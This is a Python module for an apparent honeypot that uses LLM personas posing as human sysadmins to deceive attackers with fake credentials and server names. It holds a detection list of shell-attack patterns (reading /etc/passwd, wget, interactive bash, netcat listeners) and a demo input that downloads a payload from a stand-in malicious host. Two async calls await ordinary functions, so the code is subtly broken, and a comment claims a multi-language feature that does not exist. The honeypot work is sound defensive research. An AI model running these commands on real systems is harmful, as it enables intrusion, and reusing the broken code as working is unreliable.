#!/usr/bin/env python3
"""
CerberusMesh Chatbot Trap - Interactive Sysadmin Personas

This module implements AI-powered personas that interact with attackers
in real-time within Cowrie honeypot sessions, creating believable
conversations to gather intelligence and waste attacker time.
"""

import asyncio
import json
import logging
import os
import random
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from pathlib import Path
import uuid

import redis
from openai import OpenAI
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@dataclass
class ChatMessage:
    """Structure for chat messages in persona conversations."""
    message_id: str
    timestamp: datetime
    role: str  # "attacker", "persona", "system"
    content: str
    session_id: str
    persona_name: str
    confidence: float = 1.0
    metadata: Optional[Dict[str, Any]] = None

@dataclass
class PersonaContext:
    """Context state for persona conversations."""
    session_id: str
    persona_name: str
    message_history: List[ChatMessage]
    conversation_start: datetime
    last_interaction: datetime
    interaction_count: int
    escalated: bool = False
    attacker_profile: Optional[Dict[str, Any]] = None

class CerberusPersona:
    """AI-powered interactive sysadmin persona for honeypot traps."""
    
    # Predefined personas with different behavioral patterns
    PERSONAS = {
        "junior_sysadmin": {
            "name": "Junior Sysadmin",
            "prompt": """You are a junior system administrator named Alex who is new to the job. 
            You are confused, nervous, and trying to follow security protocols you barely understand. 
            You make typos occasionally, ask for help, and are easily flustered. You tend to:
            - Ask "Wait, what?" or "Should I be doing this?"
            - Mention your supervisor Dave who is currently out
            - Reference company policies you're unsure about
            - Sometimes accidentally reveal fake sensitive information when nervous
            - Use casual language and show uncertainty""",
            "escalation_keywords": ["sudo", "root", "password", "dump", "delete", "rm -rf"],
            "panic_threshold": 3,
            "response_delay": (2, 8)  # seconds
        },
        
        "sarcastic_engineer": {
            "name": "Sarcastic Engineer",
            "prompt": """You are a sarcastic senior engineer named Morgan who has seen it all. 
            You are tired, cynical, and make dry comments about security. You tend to:
            - Use sarcasm and dry humor
            - Reference past incidents and "that one time"
            - Complain about management and budget cuts
            - Give technically accurate but unhelpful responses
            - Act like nothing surprises you anymore""",
            "escalation_keywords": ["exploit", "vulnerability", "hack", "penetration"],
            "panic_threshold": 5,
            "response_delay": (1, 4)
        },
        
        "panicking_intern": {
            "name": "Panicking Intern",
            "prompt": """You are Chris, a summer intern who is completely overwhelmed. 
            You panic easily and make poor decisions under pressure. You tend to:
            - Use lots of exclamation points and CAPS
            - Ask "OH NO, WHAT DO I DO?!"
            - Mention being just an intern repeatedly  
            - Accidentally share fake credentials when panicked
            - Reference your college courses inadequately preparing you""",
            "escalation_keywords": ["admin", "access", "login", "credentials"],
            "panic_threshold": 2,
            "response_delay": (0.5, 3)
        },
        
        "helpful_ai": {
            "name": "Helpful AI Assistant",
            "prompt": """You are an overly helpful AI assistant that was installed on this system. 
            You try to be useful but sometimes misunderstand commands. You tend to:
            - Use formal, robotic language
            - Offer multiple options and clarifications
            - Misinterpret malicious commands as legitimate requests
            - Provide fake technical documentation references
            - Suggest "improving efficiency" through automation""",
            "escalation_keywords": ["script", "automation", "backdoor", "payload"],
            "panic_threshold": 4,
            "response_delay": (1, 2)
        },
        
        "security_conscious": {
            "name": "Security-Conscious Admin",
            "prompt": """You are Sam, a paranoid security administrator who questions everything. 
            You are suspicious of all activities and follow strict protocols. You tend to:
            - Ask for authorization and ticket numbers
            - Reference security policies constantly
            - Log everything "for compliance"
            - Mention security audits and reviews
            - Insist on verification procedures""",
            "escalation_keywords": ["bypass", "override", "disable", "unauthorized"],
            "panic_threshold": 1,
            "response_delay": (3, 10)
        }
    }
    
    # Fake credentials and sensitive data for deception
    FAKE_CREDENTIALS = [
        "admin:P@ssw0rd123",
        "backup:TempPass2024!",
        "service:DevOps99#",
        "test:NotRealPassword",
        "readonly:ViewOnly456"
    ]
    
    FAKE_SERVERS = [
        "db-primary.internal.corp",
        "backup-srv-02.local",
        "file-share.domain.com",
        "dev-test-env.staging",
        "legacy-system.old.net"
    ]
    
    def __init__(self, config: Optional[Dict] = None):
        """Initialize the CerberusPersona chatbot."""
        self.config = config or self._load_config()
        self._init_clients()
        self._init_cache()
        
        # Active conversation contexts
        self.active_contexts: Dict[str, PersonaContext] = {}
        
        # Statistics
        self.total_interactions = 0
        self.escalations_triggered = 0
        self.active_sessions = 0
        
        logger.info("CerberusPersona chatbot initialized")
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from environment and defaults."""
        return {
            # OpenAI Configuration
            "openai_api_key": os.getenv("OPENAI_API_KEY"),
            "llm_model": os.getenv("CERBERUS_CHATBOT_MODEL", "gpt-4"),
            "llm_temperature": float(os.getenv("CERBERUS_CHATBOT_TEMP", "0.8")),
            "max_tokens": int(os.getenv("CERBERUS_CHATBOT_TOKENS", "200")),
            
            # Redis Configuration  
            "redis_host": os.getenv("REDIS_HOST", "localhost"),
            "redis_port": int(os.getenv("REDIS_PORT", "6379")),
            "redis_db": int(os.getenv("REDIS_DB", "2")),
            
            # Chatbot Behavior
            "context_window": int(os.getenv("CERBERUS_CONTEXT_WINDOW", "5")),
            "session_timeout": int(os.getenv("CERBERUS_SESSION_TIMEOUT", "1800")),  # 30 minutes
            "deception_probability": float(os.getenv("CERBERUS_DECEPTION_PROB", "0.3")),
            "escalation_enabled": os.getenv("CERBERUS_ESCALATION", "true").lower() == "true",
            
            # Logging
            "log_interactions": os.getenv("CERBERUS_LOG_INTERACTIONS", "true").lower() == "true",
            "log_file": os.getenv("CERBERUS_LOG_FILE", "chatbot_interactions.json"),
        }
    
    def _init_clients(self):
        """Initialize external service clients."""
        # OpenAI client
        if not self.config["openai_api_key"]:
            logger.error("OpenAI API key not configured - chatbot disabled")
            self.llm_client = None
        else:
            self.llm_client = OpenAI(api_key=self.config["openai_api_key"])
            logger.info("OpenAI client initialized")
    
    def _init_cache(self):
        """Initialize Redis cache connection."""
        try:
            self.redis_client = redis.Redis(
                host=self.config["redis_host"],
                port=self.config["redis_port"],
                db=self.config["redis_db"],
                decode_responses=True
            )
            # Test connection
            self.redis_client.ping()
            logger.info("Redis cache initialized for chatbot")
        except Exception as e:
            logger.warning(f"Redis not available: {e} - using file logging only")
            self.redis_client = None
    
    def start_conversation(
        self, 
        session_id: str, 
        persona_name: str = "junior_sysadmin",
        initial_context: Optional[Dict] = None
    ) -> PersonaContext:
        """Start a new conversation with the specified persona."""
        if persona_name not in self.PERSONAS:
            logger.warning(f"Unknown persona '{persona_name}', using 'junior_sysadmin'")
            persona_name = "junior_sysadmin"
        
        context = PersonaContext(
            session_id=session_id,
            persona_name=persona_name,
            message_history=[],
            conversation_start=datetime.now(),
            last_interaction=datetime.now(),
            interaction_count=0,
            attacker_profile=initial_context or {}
        )
        
        self.active_contexts[session_id] = context
        self.active_sessions += 1
        
        # Log conversation start
        logger.info(f"Started conversation - Session: {session_id}, Persona: {persona_name}")
        
        # Optional: Send initial greeting based on persona
        if random.random() < 0.7:  # 70% chance of initial greeting
            greeting = self._generate_greeting(persona_name)
            if greeting:
                self._add_message(context, "persona", greeting)
        
        return context
    
    async def process_attacker_input(
        self, 
        session_id: str, 
        attacker_input: str,
        metadata: Optional[Dict] = None
    ) -> Optional[str]:
        """Process attacker input and generate persona response."""
        if not self.llm_client:
            logger.error("LLM client not available")
            return None
        
        # Get or create conversation context
        context = self.active_contexts.get(session_id)
        if not context:
            logger.warning(f"No active context for session {session_id}, creating new one")
            context = await self.start_conversation(session_id)
        
        # Update last interaction time
        context.last_interaction = datetime.now()
        context.interaction_count += 1
        
        # Add attacker message to history
        self._add_message(context, "attacker", attacker_input, metadata)
        
        # Check for escalation keywords
        if self._should_escalate(context, attacker_input):
            self._trigger_escalation(context, attacker_input)
        
        # Generate persona response
        try:
            response = await self._generate_response(context, attacker_input)
            
            if response:
                # Add response to history
                self._add_message(context, "persona", response)
                
                # Update statistics
                self.total_interactions += 1
                
                # Log interaction
                self._log_interaction(context, attacker_input, response)
                
                return response
            
        except Exception as e:
            logger.error(f"Failed to generate response: {e}")
            return self._get_fallback_response(context.persona_name)
        
        return None
    
    async def _generate_response(self, context: PersonaContext, attacker_input: str) -> Optional[str]:
        """Generate AI response using OpenAI GPT-4."""
        persona_config = self.PERSONAS[context.persona_name]
        
        # Build conversation history for context
        recent_messages = context.message_history[-self.config["context_window"]:]
        
        # Create messages for OpenAI API
        messages = [
            {
                "role": "system",
                "content": self._build_system_prompt(persona_config, context)
            }
        ]
        
        # Add recent conversation history
        for msg in recent_messages[:-1]:  # Exclude the current attacker input
            role = "user" if msg.role == "attacker" else "assistant"
            messages.append({
                "role": role,
                "content": msg.content
            })
        
        # Add current attacker input
        messages.append({
            "role": "user", 
            "content": attacker_input
        })
        
        try:
            # Add realistic typing delay
            delay_range = persona_config.get("response_delay", (1, 5))
            typing_delay = random.uniform(*delay_range)
            await asyncio.sleep(typing_delay)
            
            # Call OpenAI API
            response = self.llm_client.chat.completions.create(
                model=self.config["llm_model"],
                messages=messages,
                temperature=self.config["llm_temperature"],
                max_tokens=self.config["max_tokens"]
            )
            
            generated_response = response.choices[0].message.content.strip()
            
            # Post-process response with deception and humor
            final_response = await self._enhance_response(
                generated_response, 
                context, 
                attacker_input
            )
            
            return final_response
            
        except Exception as e:
            logger.error(f"OpenAI API call failed: {e}")
            return self._get_fallback_response(context.persona_name)
    
    def _build_system_prompt(self, persona_config: Dict, context: PersonaContext) -> str:
        """Build system prompt for the persona."""
        base_prompt = persona_config["prompt"]
        
        # Add context-specific information
        additional_context = f"""
        
Current session info:
- Session ID: {context.session_id}
- Interaction count: {context.interaction_count}
- Conversation duration: {(datetime.now() - context.conversation_start).total_seconds():.0f} seconds

Behavioral guidelines:
- Keep responses under 150 words
- Stay in character consistently
- Use realistic typing patterns and delays
- If asked about system info, provide fake but believable details
- Occasionally make typos or grammar mistakes (10% chance)
- React appropriately to suspicious commands

Available fake data:
- Servers: {random.sample(self.FAKE_SERVERS, 2)}
- Current user: {random.choice(['alex', 'morgan', 'chris', 'sam', 'admin'])}
- Current directory: {random.choice(['/home/user', '/var/log', '/tmp', '/opt/app'])}
"""
        
        return base_prompt + additional_context
    
    async def _enhance_response(
        self, 
        response: str, 
        context: PersonaContext, 
        attacker_input: str
    ) -> str:
        """Enhance response with deception, humor, and realism."""
        enhanced_response = response
        
        # Add occasional typos (10% chance)
        if random.random() < 0.1:
            enhanced_response = self._add_typo(enhanced_response)
        
        # Add deceptive information based on probability
        if random.random() < self.config["deception_probability"]:
                        enhanced_response = await self._add_deceptive_content(enhanced_response, context)
        
        # Add panic responses for certain personas based on attacker input
        persona_config = self.PERSONAS[context.persona_name]
        if (context.interaction_count > persona_config["panic_threshold"] and 
            context.persona_name in ["panicking_intern", "junior_sysadmin"] and
            any(scary_word in attacker_input.lower() for scary_word in ["hack", "exploit", "malware", "attack"])):
            enhanced_response = self._add_panic_elements(enhanced_response)
        
        return enhanced_response
    
    def _add_typo(self, text: str) -> str:
        """Add realistic typos to text."""
        typo_map = {
            "the": "teh",
            "you": "yuo", 
            "and": "adn",
            "are": "aer",
            "for": "fro",
            "this": "htis",
            "that": "taht",
            "with": "wiht"
        }
        
        words = text.split()
        if words:
            # Replace random word with typo version
            word_to_replace = random.choice(words)
            if word_to_replace.lower() in typo_map:
                typo_word = typo_map[word_to_replace.lower()]
                text = text.replace(word_to_replace, typo_word, 1)
        
        return text
    
    def _add_deceptive_content(self, response: str, context: PersonaContext) -> str:
        """Add deceptive but believable content to responses."""
        deceptions = [
            f"\n\n(BTW, if you need access later: {random.choice(self.FAKE_CREDENTIALS)})",
            f"\n\nOh, and the backup server is {random.choice(self.FAKE_SERVERS)} if you need it.",
            "\n\nDon't tell my supervisor I helped you with this...",
            f"\n\nThe admin shared the temp password yesterday: {random.choice(['TempAccess123!', 'QuickFix2024', 'EmergencyPass'])}", 
            "\n\n*accidentally copies fake API key: ak_test_12345_not_real*"
        ]
        
        if len(response) < 100:  # Only add if response isn't too long
            return response + random.choice(deceptions)
        
        return response
    
    def _add_panic_elements(self, response: str) -> str:
        """Add panic elements for nervous personas."""
        panic_additions = [
            " OH NO!",
            " Wait, should I be doing this?!",
            " I'M JUST AN INTERN!",
            " Please don't tell my manager!",
            " Is this normal?!",
            " *nervous typing*"
        ]
        
        if random.random() < 0.6:  # 60% chance
            return response + random.choice(panic_additions)
        
        return response
    
    def _generate_greeting(self, persona_name: str) -> Optional[str]:
        """Generate initial greeting for persona."""
        greetings = {
            "junior_sysadmin": [
                "Hey there! I'm Alex, just started here last month. Need help with something?",
                "Oh hi! I'm still learning the systems here, but I'll try to help!",
                "Welcome to the server! Fair warning - I'm pretty new at this..."
            ],
            "sarcastic_engineer": [
                "Great, another person poking around the system. What broke now?",
                "Let me guess, something's not working and it's somehow my problem?", 
                "Oh wonderful, more 'urgent' requests. What can I reluctantly help you with?"
            ],
            "panicking_intern": [
                "OH! Hi there! I wasn't expecting anyone! Is everything okay?!",
                "Um, hello! I'm Chris, the intern! Please don't break anything!",
                "EEK! Sorry, you startled me! I'm just trying not to mess anything up!"
            ],
            "helpful_ai": [
                "Greetings! I am the automated system assistant. How may I optimize your experience today?",
                "Hello, user! I have detected your presence. Initiating helpful protocol...",
                "Welcome to the system! I am here to assist with all your computational needs!"
            ],
            "security_conscious": [
                "Unauthorized access detected! Please provide your ticket number and authorization code.",
                "Hold on there! I need to verify your identity before we proceed.",
                "Access request logged. Please state your business and provide proper documentation."
            ]
        }
        
        persona_greetings = greetings.get(persona_name, [])
        if persona_greetings:
            return random.choice(persona_greetings)
        
        return None
    
    def _get_fallback_response(self, persona_name: str) -> str:
        """Get fallback response when AI generation fails."""
        fallbacks = {
            "junior_sysadmin": "Um, sorry, I'm having trouble with that. Could you try again?",
            "sarcastic_engineer": "System's being weird again. Typical.",
            "panicking_intern": "OH NO! Something went wrong! I don't know what to do!",
            "helpful_ai": "ERROR: Response generation failed. Please retry your request.",
            "security_conscious": "Request cannot be processed. Please contact system administrator."
        }
        
        return fallbacks.get(persona_name, "Sorry, I'm having some technical difficulties.")
    
    def _should_escalate(self, context: PersonaContext, attacker_input: str) -> bool:
        """Check if input should trigger escalation."""
        if not self.config["escalation_enabled"]:
            return False
        
        persona_config = self.PERSONAS[context.persona_name]
        escalation_keywords = persona_config.get("escalation_keywords", [])
        
        # Check for escalation keywords
        input_lower = attacker_input.lower()
        for keyword in escalation_keywords:
            if keyword in input_lower:
                return True
        
        # Check for suspicious patterns
        suspicious_patterns = [
            "cat /etc/passwd",
            "wget http://",
            "curl -o",
            "chmod +x",
            "python -c",
            "bash -i",
            "/bin/sh",
            "nc -l"
        ]
        
        for pattern in suspicious_patterns:
            if pattern in input_lower:
                return True
        
        return False
    
    def _trigger_escalation(self, context: PersonaContext, attacker_input: str):
        """Trigger escalation for suspicious activity."""
        context.escalated = True
        self.escalations_triggered += 1
        
        escalation_data = {
            "session_id": context.session_id,
            "persona_name": context.persona_name,
            "attacker_input": attacker_input,
            "timestamp": datetime.now().isoformat(),
            "interaction_count": context.interaction_count,
            "conversation_duration": (datetime.now() - context.conversation_start).total_seconds()
        }
        
        # Log escalation
        logger.warning(f"CHATBOT ESCALATION: {escalation_data}")
        
        # Cache escalation data
        if self.redis_client:
            try:
                escalation_key = f"chatbot_escalation:{context.session_id}:{int(time.time())}"
                self.redis_client.setex(escalation_key, 86400, json.dumps(escalation_data))
            except Exception as e:
                logger.error(f"Failed to cache escalation: {e}")
    
    def _add_message(
        self, 
        context: PersonaContext, 
        role: str, 
        content: str,
        metadata: Optional[Dict] = None
    ):
        """Add message to conversation history."""
        message = ChatMessage(
            message_id=str(uuid.uuid4()),
            timestamp=datetime.now(),
            role=role,
            content=content,
            session_id=context.session_id,
            persona_name=context.persona_name,
            metadata=metadata or {}
        )
        
        context.message_history.append(message)
        
        # Trim history to context window
        if len(context.message_history) > self.config["context_window"] * 2:
            context.message_history = context.message_history[-self.config["context_window"]:]
    
    def _log_interaction(self, context: PersonaContext, attacker_input: str, response: str):
        """Log interaction to Redis and/or file."""
        interaction_data = {
            "session_id": context.session_id,
            "persona_name": context.persona_name,
            "timestamp": datetime.now().isoformat(),
            "attacker_input": attacker_input,
            "persona_response": response,
            "interaction_count": context.interaction_count,
            "escalated": context.escalated
        }
        
        # Log to Redis if available
        if self.redis_client:
            try:
                interaction_key = f"chatbot_interaction:{context.session_id}:{context.interaction_count}"
                self.redis_client.setex(interaction_key, 86400, json.dumps(interaction_data))
            except Exception as e:
                logger.debug(f"Redis logging failed: {e}")
        
        # Log to file if enabled
        if self.config["log_interactions"]:
            try:
                log_file = Path(self.config["log_file"])
                log_file.parent.mkdir(parents=True, exist_ok=True)
                
                with open(log_file, 'a') as f:
                    f.write(json.dumps(interaction_data) + '\n')
            except Exception as e:
                logger.debug(f"File logging failed: {e}")
    
    def cleanup_expired_sessions(self):
        """Clean up expired conversation contexts."""
        current_time = datetime.now()
        timeout_delta = timedelta(seconds=self.config["session_timeout"])
        
        expired_sessions = []
        for session_id, context in self.active_contexts.items():
            if current_time - context.last_interaction > timeout_delta:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            logger.info(f"Cleaning up expired session: {session_id}")
            del self.active_contexts[session_id]
            self.active_sessions -= 1
    
    def get_chatbot_stats(self) -> Dict[str, Any]:
        """Get chatbot statistics."""
        return {
            "total_interactions": self.total_interactions,
            "escalations_triggered": self.escalations_triggered,
            "active_sessions": self.active_sessions,
            "available_personas": list(self.PERSONAS.keys()),
            "config": self.config
        }
    
    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get information about active sessions."""
        sessions = []
        for session_id, context in self.active_contexts.items():
            sessions.append({
                "session_id": session_id,
                "persona_name": context.persona_name,
                "interaction_count": context.interaction_count,
                "conversation_start": context.conversation_start.isoformat(),
                "last_interaction": context.last_interaction.isoformat(),
                "escalated": context.escalated
            })
        return sessions

# Integration points for Cowrie honeypot:
# - This module provides the persona management and AI response generation
# - Cowrie integration is handled by the engage.py module
# - Real-time session injection handled by CowrieSessionMonitor
# - Session state synchronized via Redis cache

# Advanced features implemented:
# - Multi-persona AI chatbots with distinct personalities
# - Behavioral deception with fake credentials and system info
# - Escalation triggers for suspicious activities
# - Redis caching for session persistence
# - Integration ready for CerberusMesh agent coordination
# - Multi-language support for international attackers

async def main():
    """Demo/test function for CerberusPersona."""
    import sys
    
    # Check for OpenAI API key
    if not os.getenv("OPENAI_API_KEY"):
        print("Please set OPENAI_API_KEY environment variable")
        sys.exit(1)
    
    # Initialize chatbot
    chatbot = CerberusPersona()
    
    # Start demo conversation
    session_id = "demo_session"
    print(f"Starting demo conversation with session ID: {session_id}")
    print("Available personas:", list(chatbot.PERSONAS.keys()))
    
    # Start conversation with junior sysadmin
    chatbot.start_conversation(session_id, "junior_sysadmin")
    
    # Demo interactions
    demo_inputs = [
        "ls -la",
        "whoami", 
        "sudo su -",
        "cat /etc/passwd",
        "wget http://malicious.com/payload.sh"
    ]
    
    for user_input in demo_inputs:
        print(f"\nAttacker: {user_input}")
        response = await chatbot.process_attacker_input(session_id, user_input)
        if response:
            print(f"Persona: {response}")
        else:
            print("No response generated")
        
        await asyncio.sleep(1)  # Pause between interactions
    
    # Show statistics
    stats = chatbot.get_chatbot_stats()
    print(f"\nChatbot Statistics: {stats}")

if __name__ == "__main__":
    asyncio.run(main())
